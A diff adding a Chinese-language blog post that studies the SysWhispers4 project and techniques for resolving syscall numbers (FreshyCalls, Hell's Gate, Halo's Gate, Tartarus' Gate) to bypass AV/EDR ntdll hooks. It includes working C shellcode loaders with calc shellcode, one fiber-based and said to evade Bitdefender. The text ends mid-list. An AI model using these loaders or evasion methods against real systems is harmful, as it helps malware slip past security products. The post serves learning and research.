@@ -1,0 +1,877 @@
+<!DOCTYPE html>
+<html lang="en" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="author" content="John Doe" />
+  <!-- Open Graph Description 简短摘要-->
+  
+  <!-- 用于搜索引擎的文章摘要 -->
+  
+  
+  
+  <title>
+    
+      以SysWhispers4项目学习系统调用 
+      
+      
+      |
+    
+     oneday
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/favicon.jpg">
+    <link rel="icon" href="/images/favicon.jpg">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+    
+<link rel="stylesheet" href="/css/figcaption/mac-block.css">
+
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  <!-- Cloudflare Web Analytics -->
+  <script defer src="https://static.cloudflareinsights.com/beacon.min.js" data-cf-beacon='{"token": "c51fa9d4309a4cc29084417c30c738c0"}'></script>
+  <!-- End Cloudflare Web Analytics -->
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/avatar.jpg" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">oneday</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/categories/">
+          <a href="/categories/">Categories</a>
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          <a href="/friends/">Friends</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">About</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">以SysWhispers4项目学习系统调用</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+          2026-06-20 16:29:34
+        </span>
+        
+              <span class="post-categories">
+                <i class="iconfont icon-bookmark" title="Categories"></i>
+                
+                <span class="span--category">
+                  <a href="/categories/%E9%98%B2%E5%BE%A1%E8%A7%84%E9%81%BF/" title="防御规避">
+                    <b>#</b> 防御规避
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <h1 id="一、核心用途"><a href="#一、核心用途" class="headerlink" title="一、核心用途"></a>一、核心用途</h1><h2 id="1-1-项目架构"><a href="#1-1-项目架构" class="headerlink" title="1.1 项目架构"></a>1.1 项目架构</h2><p>SysWhispers4是一个Windows NT系统调用桩代码（stub）生成器，它的核心目标是：绕过AV&#x2F;EDR 在ntdll.dll上设置的用户态钩子，直接或间接地发起系统调用。</p>
+<p>项目架构</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">SysWhispers4/</span><br><span class="line">├── syswhispers.py              # CLI 入口，解析参数，调用生成器</span><br><span class="line">├── core/</span><br><span class="line">│   ├── models.py               # 数据模型：枚举 + 配置数据类</span><br><span class="line">│   ├── generator.py            # 代码生成引擎（~2340行，核心）</span><br><span class="line">│   ├── obfuscator.py           # 混淆工具：垃圾指令、egg、XOR、字符串加密</span><br><span class="line">│   └── utils.py                # 哈希函数（DJB2/CRC32/FNV-1a）、数据加载</span><br><span class="line">├── data/</span><br><span class="line">│   ├── prototypes.json         # 64个 NT 函数原型（签名、参数、返回值）</span><br><span class="line">│   ├── presets.json            # 8个预设函数组合（common/injection/stealth等）</span><br><span class="line">│   ├── syscalls_nt_x64.json   # x64 SSN 表（Win7~Win11 24H2）</span><br><span class="line">│   └── syscalls_nt_x86.json   # x86 SSN 表</span><br><span class="line">├── scripts/</span><br><span class="line">│   └── update_syscall_table.py # 从 j00ru 自动更新 SSN 表</span><br><span class="line">└── examples/</span><br><span class="line">    └── example_injection.c     # 集成示例   </span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>层级</th>
+<th>解决的问题</th>
+<th>代表技术</th>
+<th>核心作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>SSN 解析</strong></td>
+<td>如何获取系统调用号</td>
+<td>静态 j00ru 表、Hell’s Gate、Halo’s Gate、Tartarus’ Gate、FreshyCalls、SyscallsFromDisk、RecycledGate、HW Breakpoint</td>
+<td>找到目标 Nt&#x2F;Zw 函数对应的 SSN</td>
+</tr>
+<tr>
+<td><strong>调用方式</strong></td>
+<td>如何执行 <code>syscall</code> 指令</td>
+<td>Embedded、Indirect、Randomized、Egg Hunt</td>
+<td>决定 <code>syscall</code> 指令在本模块执行，还是跳到 <code>ntdll</code> 中执行</td>
+</tr>
+<tr>
+<td><strong>逃逸技术</strong></td>
+<td>如何降低检测特征</td>
+<td>SSN XOR、调用栈伪造、ETW&#x2F;AMSI bypass、ntdll unhooking、反调试、睡眠加密、垃圾指令注入</td>
+<td>降低静态扫描、用户态 Hook、调用栈检测和行为检测的命中率</td>
+</tr>
+</tbody></table>
+<p>简单来说，SysWhispers4可以理解为一个三层组合框架：<strong>先获取 SSN，再选择 syscall 执行方式，最后叠加规避手段降低检测特征。</strong></p>
+<h2 id="1-2-何为Inline-hook"><a href="#1-2-何为Inline-hook" class="headerlink" title="1.2 何为Inline-hook"></a>1.2 何为Inline-hook</h2><p>在这里先放段一个经典的创建线程执行shellcode</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;Windows.h&gt;</span><br><span class="line"></span><br><span class="line">// calc的shellcode</span><br><span class="line">unsigned char buf[] = &#123;</span><br><span class="line">    0x50, 0x51, 0x52, 0x53, 0x56, 0x57, 0x55, 0x6A, 0x60, 0x5A,</span><br><span class="line">0x68, 0x63, 0x61, 0x6C, 0x63, 0x54, 0x59, 0x48, 0x83, 0xEC,</span><br><span class="line">0x28, 0x65, 0x48, 0x8B, 0x32, 0x48, 0x8B, 0x76, 0x18, 0x48,</span><br><span class="line">0x8B, 0x76, 0x10, 0x48, 0xAD, 0x48, 0x8B, 0x30, 0x48, 0x8B,</span><br><span class="line">0x7E, 0x30, 0x03, 0x57, 0x3C, 0x8B, 0x5C, 0x17, 0x28, 0x8B,</span><br><span class="line">0x74, 0x1F, 0x20, 0x48, 0x01, 0xFE, 0x8B, 0x54, 0x1F, 0x24,</span><br><span class="line">0x0F, 0xB7, 0x2C, 0x17, 0x8D, 0x52, 0x02, 0xAD, 0x81, 0x3C,</span><br><span class="line">0x07, 0x57, 0x69, 0x6E, 0x45, 0x75, 0xEF, 0x8B, 0x74, 0x1F,</span><br><span class="line">0x1C, 0x48, 0x01, 0xFE, 0x8B, 0x34, 0xAE, 0x48, 0x01, 0xF7,</span><br><span class="line">0x99, 0xFF, 0xD7, 0x48, 0x83, 0xC4, 0x30, 0x5D, 0x5F, 0x5E,</span><br><span class="line">0x5B, 0x5A, 0x59, 0x58, 0xC3</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line"></span><br><span class="line">	// 申请一块大小为buf字节数组长度的可读可行的内存区域</span><br><span class="line">	LPVOID pMemory = VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line"></span><br><span class="line">	// 将buf数组中的内容复制到刚刚分配的内存区域</span><br><span class="line">	RtlMoveMemory(pMemory, buf, sizeof(buf));</span><br><span class="line"></span><br><span class="line">	// 创建一个线程执行内存中的代码</span><br><span class="line">	HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pMemory, NULL, 0, NULL);</span><br><span class="line"></span><br><span class="line">	// 等待线程执行完成</span><br><span class="line">	WaitForSingleObject(hThread, INFINITE);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在bitdefender环境下，用x64dbg运行编译的shellcode加载器，查看它的内存模块，多出了两个可疑的dll：<code>atcuf64.dll</code>和<code>bdhkm64.dll</code></p>
+<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images%2F2026%2F06%2F08%2F23-26-04-ee742a2c23ad72a63444a03673ccb61d-PixPin_2026-06-08_23-26-02-8cbb0f.png" alt="PixPin_2026-06-08_23-26-02.png"></p>
+<p>我们看CreateThread最底层的ZwCreateThreadEx，它是进入Ring0的stub</p>
+<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images%2F2026%2F06%2F08%2F23-29-55-6391ebfce8e309c77d0add4644423e69-PixPin_2026-06-08_23-29-52-e919bd.png" alt="PixPin_2026-06-08_23-29-52.png"></p>
+<p>正常来说未被Hook的Nt或Zw函数的stub都是按照x64 syscall 约定要求，进入内核前把第一个参数从 <code>rcx</code> 复制到 <code>r10</code>，并把系统调用号放入 <code>Rax</code>。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mov r10,rcx</span><br><span class="line">mov eax,CA</span><br><span class="line">test byte ptr ds:[7FFE0308],1</span><br><span class="line">jne ntdll.7FF84E0635D5</span><br><span class="line">syscall </span><br><span class="line">ret </span><br><span class="line">int 2E</span><br><span class="line">ret </span><br></pre></td></tr></table></figure>
+
+<p>其jmp 7FF84E170600 ，表明ZwCreateThreadEx函数入口被改写成跳转了到其他地方。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">jmp 7FF84E170600</span><br><span class="line">int3 </span><br><span class="line">int3 </span><br><span class="line">int3 </span><br><span class="line">test byte ptr ds:[7FFE0308],1</span><br><span class="line">jne ntdll.7FF84E0635B5</span><br><span class="line">syscall </span><br><span class="line">ret </span><br><span class="line">int 2E</span><br><span class="line">ret </span><br></pre></td></tr></table></figure>
+
+<p>所以可以肯定NtCreateThreadEx的stub被Bitdefender Hook了，Jmp指令就是AV&#x2F;EDR最常见 <code>Inline-Hook</code> ，它会跳转到atcuf64.dll这个dll中那里进行检查。</p>
+<p>那么本篇文章就是来探讨解决方案：用系统调用，动态获取SSN，直接绕过Inline-Hook。</p>
+<p>间接系统调用inject.exe → ntdll!NtAllocateVirtualMemory-&gt;通过syscall进入内核，syscall指令发生在ntdll.dll</p>
+<p>直接系统调用inject.exe-&gt;通过syscall进入内核，syscall指令发生在inject2.exe</p>
+<p>不过，直接使用系统调用创建线程执行shellcode，是否就能绕过Bitdefender呢？实际测试结果并不理想。</p>
+<p>以 <code>NtCreateThreadEx</code> 为例，使用直接系统调用或间接系统调用确实可以绕过部分基于 <code>ntdll</code> inline hook 的用户态拦截，也可能避开静态扫描中的部分特征。但是一旦loader 运行，仍然被Bitdefender拦截。</p>
+<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images%2F2026%2F06%2F20%2F14-15-39-77dc42e882fd60d843f8486173d4968c-PixPin_2026-06-20_14-15-27-5193af.png" alt="PixPin_2026-06-20_14-15-27.png"></p>
+<p>换个思路，我们不再通过<code>NtCreateThreadEx</code> 创建新线程，而是使用纤程切换执行shellcode，避免触发“新线程执行可疑内存”这一类行为特征。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;Windows.h&gt;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">    unsigned char buf[] = &#123;</span><br><span class="line">    0x50, 0x51, 0x52, 0x53, 0x56, 0x57, 0x55, 0x6A, 0x60, 0x5A,</span><br><span class="line">0x68, 0x63, 0x61, 0x6C, 0x63, 0x54, 0x59, 0x48, 0x83, 0xEC,</span><br><span class="line">0x28, 0x65, 0x48, 0x8B, 0x32, 0x48, 0x8B, 0x76, 0x18, 0x48,</span><br><span class="line">0x8B, 0x76, 0x10, 0x48, 0xAD, 0x48, 0x8B, 0x30, 0x48, 0x8B,</span><br><span class="line">0x7E, 0x30, 0x03, 0x57, 0x3C, 0x8B, 0x5C, 0x17, 0x28, 0x8B,</span><br><span class="line">0x74, 0x1F, 0x20, 0x48, 0x01, 0xFE, 0x8B, 0x54, 0x1F, 0x24,</span><br><span class="line">0x0F, 0xB7, 0x2C, 0x17, 0x8D, 0x52, 0x02, 0xAD, 0x81, 0x3C,</span><br><span class="line">0x07, 0x57, 0x69, 0x6E, 0x45, 0x75, 0xEF, 0x8B, 0x74, 0x1F,</span><br><span class="line">0x1C, 0x48, 0x01, 0xFE, 0x8B, 0x34, 0xAE, 0x48, 0x01, 0xF7,</span><br><span class="line">0x99, 0xFF, 0xD7, 0x48, 0x83, 0xC4, 0x30, 0x5D, 0x5F, 0x5E,</span><br><span class="line">0x5B, 0x5A, 0x59, 0x58, 0xC3</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    // 修改shellcode所在内存的保护属性为可读、可写、可执行</span><br><span class="line">    DWORD oldProtect;</span><br><span class="line">    VirtualProtect((LPVOID)buf, sizeof(buf), PAGE_EXECUTE_READWRITE, &amp;oldProtect);</span><br><span class="line"></span><br><span class="line">    // 将当前线程转换为纤程（轻量级线程）</span><br><span class="line">    ConvertThreadToFiber(NULL);</span><br><span class="line"></span><br><span class="line">    // 创建一个纤程对象，关联到shellcode作为纤程入口点，使用默认栈大小和无标志位</span><br><span class="line">    void* shellcodeFiber = CreateFiber(0, (LPFIBER_START_ROUTINE)(LPVOID)buf, NULL);</span><br><span class="line"></span><br><span class="line">    // 切换到新创建的纤程，开始执行shellcode</span><br><span class="line">    SwitchToFiber(shellcodeFiber);</span><br><span class="line"></span><br><span class="line">    // shellcode执行完毕后，删除纤程对象</span><br><span class="line">    DeleteFiber(shellcodeFiber);</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到轻松绕过，这也侧面说明问题并不只在于“有没有调用 <code>CreateThread</code>”或“有没有经过被 Hook 的 <code>ntdll</code> stub”。即使绕开了用户态hook，安全产品仍然可以从更高层的行为链路进行判断，例如：</p>
+<ul>
+<li>进程内出现可执行内存；</li>
+<li>内存权限从RW&#x2F;RX&#x2F;RWX发生异常变化；</li>
+<li>shellcode在非正常模块区域执行；</li>
+<li>调用栈、返回地址或执行区域异常；</li>
+<li>行为序列符合典型 loader 特征。</li>
+</ul>
+<p>换句话说，系统调用并不是万能的。它主要解决的是<strong>绕过 AV&#x2F;EDR 在</strong> <code>ntdll.dll</code> <strong>上设置的 inline hook</strong>这一类问题，但并不能天然绕过行为分析、内存扫描、调用栈检测或内核侧遥测。</p>
+<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images%2F2026%2F06%2F20%2F14-19-21-1b5f1695c393f42f2fe25fa0b6d429c7-PixPin_2026-06-20_14-19-17-cc82bb.png" alt="PixPin_2026-06-20_14-19-17.png"></p>
+<h1 id="二、SSN-解析策略（怎么找到syscall编号）"><a href="#二、SSN-解析策略（怎么找到syscall编号）" class="headerlink" title="二、SSN 解析策略（怎么找到syscall编号）"></a>二、SSN 解析策略（怎么找到syscall编号）</h1><h2 id="2-1-FreshyCalls"><a href="#2-1-FreshyCalls" class="headerlink" title="2.1 FreshyCalls"></a>2.1 FreshyCalls</h2><p><strong>原理</strong>：FreshyCalls不直接读取<code>ntdll</code> 函数入口中的 <code>mov eax, SSN</code> 指令，而是枚举 <code>ntdll.dll</code> 导出表中的 <code>Nt*</code> 系列函数，并按照函数导出地址从低到高排序。在常见Windows x64版本中，系统调用stub在 <code>ntdll</code> 中通常按照SSN递增顺序排列，因此排序后的数组下标可以被用来推算对应函数的SSN。</p>
+<p><strong>优点</strong>：实现简单，只枚举导出表，只使用导出名和导出地址，不读取函数入口字节。</p>
+<p>①解析<code>ntdll</code>的 PE 导出表</p>
+<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images%2F2026%2F06%2F10%2F20-41-02-7514f9bf749ead6fb2b8e8034c7a680f-PixPin_2026-06-10_20-40-58-f1e884.png" alt="PixPin_2026-06-10_20-40-58.png"></p>
+<p>这一步的目的就是：<strong>拿到ntdll中所有导出函数的名字和地址</strong>。</p>
+<p>②收集所有 <code>Nt*</code> 导出</p>
+<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images%2F2026%2F06%2F10%2F20-44-27-80e621dbb9d98c02832333831c977446-PixPin_2026-06-10_20-44-23-4b8f18.png" alt="PixPin_2026-06-10_20-44-23.png"></p>
+<p><strong>注意</strong>：使用 <code>SysWhispers4</code> 原始项目的 <code>FreshyCalls</code> 算法在我本机上计算出的SSN是6，但实际的SSN是2，因为NtdllDefWindowProc_A、NtdllDefWindowProc_W、NtdllDialogWndProc_A、NtdllDialogWndProc_W这四个函数虽然是Nt开头，但不是真正的系统调用。</p>
+<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images%2F2026%2F06%2F10%2F19-53-38-a7b8c1a8c0af2fe0e03c2277537f2925-PixPin_2026-06-10_19-53-02-291a5d.png" alt="PixPin_2026-06-10_19-53-02.png"></p>
+<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images%2F2026%2F06%2F10%2F19-54-12-84f06cde547943c40ccd1dbd8879b697-PixPin_2026-06-10_19-54-08-13a6e7.png" alt="PixPin_2026-06-10_19-54-08.png"></p>
+<p>解决方法也很简单：排除Ntdll* 等非syscall导出，Nt后面必须跟大写字母（一般规律）</p>
+<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images%2F2026%2F06%2F10%2F20-31-49-740c1599b44ffce2671f326545aa2fc6-PixPin_2026-06-10_20-31-46-ace0e4.png" alt="PixPin_2026-06-10_20-31-46.png"></p>
+<p>③按导出地址排序，得到FreshyCalls候选SSN，这是FreshyCalls的核心。</p>
+<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images%2F2026%2F06%2F10%2F20-45-37-ef38f797ca36ea95b9b5aa46b5d0cdf4-PixPin_2026-06-10_20-45-33-3847fc.png" alt="PixPin_2026-06-10_20-45-33.png"></p>
+<p>测试一下在有Bitdefender inline hook的情况下，是否还能正常获取SSN。可以看到下图我们计算出的NtAllocateVirtualMemory SSN &#x3D; 24，而x64dbg调试出的NtAllocateVirtualMemory SSN &#x3D; 0x18 &#x3D; 24，没毛病。</p>
+<p>计算出的NtCreateThreadEx SSN &#x3D; 201 &#x3D; 0xC9，而NtCreateThreadEx被Hook了，我们看它的下一个邻居<br>NtCreateThreadStateChange SSN &#x3D; 0xCA，刚好是NtCreateThreadEx SSN的下一个编号。</p>
+<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images%2F2026%2F06%2F10%2F20-52-39-b1c6e132049f9e92ba2ba0f68d240303-PixPin_2026-06-10_20-52-35-f1e37c.png" alt="PixPin_2026-06-10_20-52-35.png"></p>
+<h2 id="2-2-Hell’s-Gate"><a href="#2-2-Hell’s-Gate" class="headerlink" title="2.2 Hell’s Gate"></a>2.2 Hell’s Gate</h2><p><strong>核心思路</strong>：从ntdll导出表找到Nt* 函数地址，直接读函数入口的机器码字节，扫描 4C 8B D1 B8（）模式，提取紧随的 2 字节作为 SSN。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">4C 8B D1    mov r10, rcx      ; 保存第1个参数（rcx 是 Win64 调用约定的参数1）</span><br><span class="line">B8 XX XX    mov eax, SSN      ; 将 SSN 加载到 eax</span><br></pre></td></tr></table></figure>
+
+<p>项目作者在注释说了，它有一个致命问题： EDR hook会覆盖函数入口字节（4C 8B D1 B8 → E9 XX XX XX XX），模式匹配失败，SSN就拿不到了。</p>
+<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images%2F2026%2F06%2F11%2F18-47-27-ee76c7a410cd7a47b54b0a8811f40699-PixPin_2026-06-11_18-47-24-aa16ab.png" alt="PixPin_2026-06-11_18-47-24.png"></p>
+<p>NtWriteVirtualMemory被Hook的情况</p>
+<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images%2F2026%2F06%2F11%2F18-53-43-902ab7c9a399ed937c5d154f5f4dd649-PixPin_2026-06-11_18-53-32-3357ee.png" alt="PixPin_2026-06-11_18-53-32.png"></p>
+<p>未被Hook能正确获取SSN</p>
+<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images%2F2026%2F06%2F11%2F18-55-08-39745032be2394475f224381c0b819a9-PixPin_2026-06-11_18-55-05-0e9c05.png" alt="PixPin_2026-06-11_18-55-05.png"></p>
+<h2 id="2-3-Halo’s-Gate"><a href="#2-3-Halo’s-Gate" class="headerlink" title="2.3 Halo’s Gate"></a>2.3 Halo’s Gate</h2><p>Halo’s Gate是在Hell’s Gate的基础上发展起来的一种变体，和Hell’s Gate一样，读函数入口字节提取SSN。但被hook时不放弃，而是搜索附近的干净邻居函数，用邻居的SSN推算自己的SSN。</p>
+<p>Windows的系统调用号（SSN）在内存中是连续且严格按照导出函数地址顺序排列的。如果目标函数被Hook了，它通常只会影响该函数开头的几个字节，而它在内存中<strong>向上或向下相邻的系统调用函数</strong>大概率是干净的（未被 Hook）。</p>
+<p>①遍历 <code>ntdll</code> 的导出表，过滤出所有 <code>Nt*</code> 函数，按导出地址排序</p>
+<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images%2F2026%2F06%2F11%2F19-23-03-ce9faa95aaa7f5c3ab0ac945a1f0f3a0-PixPin_2026-06-11_19-22-58-051eeb.png" alt="PixPin_2026-06-11_19-22-58.png"></p>
+<p>②传统地狱之门检查（Clean Stub）</p>
+<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images%2F2026%2F06%2F11%2F19-24-55-8e46dd7a3adef229a8d6ac041f6f710f-PixPin_2026-06-11_19-24-46-108655.png" alt="PixPin_2026-06-11_19-24-46.png"></p>
+<p>③如果当前函数被 Hook（未匹配到特征码），就搜索目标函数的上下干净邻居的SSN</p>
+<ul>
+<li><strong>delta（距离）</strong>：控制搜索的步长</li>
+<li><strong>dir（方向）</strong>：<code>dir = -1</code> 代表向<strong>低地址</strong>（索引减小）方向找。<code>dir = 1</code> 代表向<strong>高地址</strong>（索引增大）方向找。</li>
+</ul>
+<p>内层的<code>dir</code>循环每次步进<code>2</code>（<code>dir += 2</code>），所以<code>dir</code>的取值序列严格为：<code>-1</code>，然后是<code>1</code>。当外层<code>delta</code>增长时，实际检查的数组索引<code>ni</code>顺序如下：</p>
+<ol>
+<li><code>delta = 1, dir = -1</code> \rightarrow <code>ni = myIdx - 1</code> （紧邻的上一个）</li>
+<li><code>delta = 1, dir = 1</code> \rightarrow <code>ni = myIdx + 1</code> （紧邻的下一个）</li>
+<li><code>delta = 2, dir = -1</code> \rightarrow <code>ni = myIdx - 2</code> （上两个）</li>
+<li><code>delta = 2, dir = 1</code> \rightarrow <code>ni = myIdx + 2</code> （下两个）</li>
+</ol>
+<p>在上下邻居中找找标准的Windows x64 Syscall Stub汇编特征码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov r10, rcx    ; 4C 8B D1</span><br><span class="line">mov eax, SSN    ; B8 XX XX 00 00</span><br></pre></td></tr></table></figure>
+
+<p>找到之后，用统一公式计算目标函数的SSN：<code>ssn = neighborSsn - (delta * dir)</code>，完美融合了向上和向下两种完全相反的搜索逻辑。</p>
+<p>具体算法我不想多说了，问ai吧。</p>
+<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images%2F2026%2F06%2F11%2F19-27-20-a311b22dcbfe7d36759b1bba4c691828-PixPin_2026-06-11_19-27-18-2fe528.png" alt="PixPin_2026-06-11_19-27-18.png"></p>
+<p>在bitdefender的环境下，能正确解析被Hook Nt函数的SSN。</p>
+<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images%2F2026%2F06%2F11%2F19-46-04-e9d55ea9afb1cca18b367ccafc681861-PixPin_2026-06-11_19-46-02-271992.png" alt="PixPin_2026-06-11_19-46-02.png"></p>
+<h2 id="2-4-Tartarus’-Gate"><a href="#2-4-Tartarus’-Gate" class="headerlink" title="2.4 Tartarus’ Gate"></a>2.4 Tartarus’ Gate</h2><p>它在Halo’s Gate的基础上引入了更严苛的挂钩判定函数（<code>IsHooked</code>），并且将邻居搜索半径扩大到了16。</p>
+<p>在Halo’s Gate中，判断一个函数是否被挂钩的标准是：只要没匹配到 <code>4C 8B D1 B8</code> 特征，程序就<strong>默认</strong>它被挂钩了，直接去盲找邻居。</p>
+<p>而Tartarus’ Gate更加严谨：用一个辅助函数 <code>IsHooked</code> 来主动判断Nt函数的开头几个字节是否被Hook，这个辅助函数是Tartarus’ Gate 的精华，它罗列了主流安全软件最常用的几种Hook指令：</p>
+<ol>
+<li><code>pFn[0] == 0xE9u</code> (Near JMP)：直接强行跳转到EDR自身的检测模块</li>
+<li><code>pFn[0] == 0xFFu &amp;&amp; pFn[1] == 0x25u</code> (Far&#x2F;Absolute JMP)：如果EDR自己的内存模块离<code>ntdll</code>的距离超过了<code>E9</code>跳转的2GB限制，它就必须借用RIP相对寻址</li>
+<li><code>pFn[0] == 0xE8u</code> (CALL)：有些EDR会在这里放一个<code>CALL</code>指令进入检测函数，检测完后再通过<code>ret</code>返回或直接在函数内部还原上下文。</li>
+<li><code>pFn[0] == 0xCCu</code> (INT 3)：在敏感函数头放一个 <code>0xCC</code>，一旦触发，就通过注册的向量化异常处理（VEH）捕捉异常，在异常回调里审查调用栈。</li>
